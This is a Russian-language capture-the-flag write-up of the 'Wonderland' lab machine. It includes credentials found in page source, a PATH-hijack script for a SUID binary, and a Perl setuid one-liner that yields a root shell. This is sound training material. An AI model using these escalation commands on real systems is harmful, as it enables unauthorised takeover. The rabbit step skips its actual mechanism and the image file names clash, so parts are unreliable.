**Отчет по пентесту машины Wonderland**

**Дата проведения:** 07.09.2026  
**Цель:** Получение полного доступа к системе (root) на машине Wonderland.


### 1. Разведка и обнаружение уязвимостей

**1.1. Сканирование сети**  
Первым этапом проведено сканирование портов с использованием Nmap. Обнаружены следующие открытые порты:

- **22/tcp** – SSH (OpenSSH 7.6p1)  
- **80/tcp** – HTTP (Golang net/http server, заголовок указывает на Go-IPFS или InfluxDB API)

**1.2. Анализ веб-приложения**  
На главной странице по адресу `/` не обнаружено полезной информации, кроме заголовка: *"Follow the white rabbit."*.

В ходе фаззинга директорий найдены следующие пути:

- `/r/` — содержит фразу *Keep Going* и цитату из "Алисы в Стране чудес".
- `/r/a/` — аналогично, фраза *Keep Going* и цитата.
- `/r/a/b/` — продолжение.
- `/r/a/b/b/` — продолжение.
- `/r/a/b/b/i/t/` — конечная директория, содержащая сообщение:  
  *"Open the door and enter wonderland"*, а также изображение `alice_door.png`.

**1.3. Стеганография**  
В ходе анализа изображений:

- `alice_door.jpg`: с использованием `stegseek` с wordlist `rockyou.txt` не удалось найти пароль.
- `white_rabbit_1.jpg`: с помощью `stegseek` удалось извлечь скрытый файл `hint.txt`, содержащий подсказку: *"follow the r a b b i t"*.

**1.4. Исходный код страницы**  
В исходном коде страницы `/r/a/b/b/i/t/` найдена скрытая строка:

```
alice:HowDothTheLittleCrocodileImproveHisShiningTail
```

Данная строка используется как пара логин:пароль для SSH-доступа от пользователя `alice`.


### 2. Получение доступа к системе

**2.1. SSH-авторизация**  
Используя найденные учетные данные, выполнен вход по SSH:

```bash
ssh alice@10.10.10.10
```

**2.2. Разведка внутри системы**  
После получения доступа проведен анализ пользователей и файловой системы:

- Пользователи: `alice`, `hatter`, `rabbit`, `tryhackme`.
- В домашней директории `alice` обнаружен файл `walrus_and_the_carpenter.py`, принадлежащий `root`.

**2.3. Выполнение sudo от имени rabbit**  
С помощью команды `sudo -l` обнаружено:

```
User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

Запуск скрипта от имени `rabbit` позволил получить доступ к пользователю `rabbit`:

```bash
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

После выполнения стало доступно окружение пользователя `rabbit` (UID 1002).


### 3. Эскалация привилегий до hatter

**3.1. Обнаружение SUID-файла**  
В домашней директории пользователя `rabbit` найден бинарный файл с SUID-битом:

```bash
-rwsr-sr-x 1 root root 16816 May 25 2020 teaParty
```

**3.2. Анализ бинарного файла через Ghidra**  
В ходе реверс-инжиниринга установлено, что программа:

- Устанавливает UID и GID в `0x3eb` (десятичное 1003).
- Выполняет команду:  
  `/bin/echo -n 'Probably by ' && date --date='next hour' -R`
- Ожидает ввода через `getchar()` и завершается.

**3.3. Эксплуатация через подмену переменной PATH**  
Поскольку программа вызывает `date` без полного пути, использован метод подмены переменной окружения:

```bash
export PATH=/tmp:$PATH
echo '#!/bin/bash' > /tmp/date
echo '/bin/bash' >> /tmp/date
chmod +x /tmp/date
./teaParty
```

В результате выполнения получен доступ от пользователя `hatter` (UID 1003).


### 4. Эскалация до root

**4.1. Поиск пароля пользователя hatter**  
В домашней директории `hatter` обнаружен файл с паролем:

```
WhyIsARavenLikeAWritingDesk?
```

Данный пароль использован для входа под пользователем `hatter`.

**4.2. Обнаружение capabilities у Perl**  
В ходе анализа системы с помощью `linpeas` выявлено, что интерпретатор Perl обладает capability:

```
/usr/bin/perl = cap_setuid+ep
```

Это позволяет устанавливать эффективный UID процесса.

**4.3. Использование Perl для получения root**  
Выполнена команда, использующая модуль POSIX для вызова `setuid(0)` и запуска шелла:

```bash
perl -e 'use POSIX qw(setuid); setuid(0); system("/bin/bash");'
```

После выполнения получен доступ от пользователя `root`:

```
uid=0(root) gid=1003(hatter) groups=1003(hatter)
```


### 5. Итоговый вывод

В ходе пентеста машины Wonderland были успешно реализованы следующие этапы:

1. **Разведка:** Сканирование портов, фаззинг директорий, анализ исходного кода и стеганография.
2. **Получение доступа:** Использование найденных учетных данных для SSH-входа от пользователя `alice`.
3. **Эскалация до rabbit:** Запуск Python-скрипта через `sudo` от имени `rabbit`.
4. **Эскалация до hatter:** Использование SUID-бита и подмены переменной `PATH` в бинарном файле `teaParty`.
5. **Получение root:** Использование capability `cap_setuid+ep` интерпретатора Perl для установки UID 0 и получения шелла root.

**Результат:** Полный контроль над системой достигнут. Компрометация корневого пользователя подтверждена.
